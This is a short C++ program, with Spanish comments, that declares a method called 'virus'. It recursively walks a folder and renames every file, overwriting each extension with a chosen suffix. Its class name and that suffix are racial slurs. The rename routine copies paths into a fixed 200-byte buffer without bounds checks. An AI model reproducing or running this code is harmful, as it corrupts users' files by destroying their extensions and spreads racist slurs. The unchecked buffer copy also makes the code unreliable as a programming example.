#include <iostream>
#include <string>
#include <string.h>
#include <filesystem>

using namespace std;
using namespace std::filesystem;

class nigger
{
	public:
		string suffix;
		void virus(string path)
		{
			for (const auto & entry : directory_iterator(path))
			{
				if (entry.is_directory())
				{
					cout << "Folder: ";
					cout << entry.path() << endl;
					virus(entry.path().string());
				}
				else
				{
					cout << "File: ";
					cout << entry.path() << endl;

					rename(entry.path().string(), rename_suffix(entry.path().string()));
				}
			}
		}
		string rename_suffix(string str)
		{
			int i, j;
			char aux[200];

			strcpy_s (aux, str.c_str());

			for (i = 0; i < strlen(aux); i++)
				if (aux[i] == '.')
					break;


			for (j = 0; j < size(suffix); j++)
				aux[i + j + 1] = suffix[j];
				aux[i + j + 1] = '\0';

				return aux;



		}
};

int main()
{
	nigger obj;
	obj.suffix = "negro"; // nombre de la extension
	obj.virus("C:\\Users\\NW USER\\Desktop\\niggertest"); //carpeta selccionar
	return 0;
}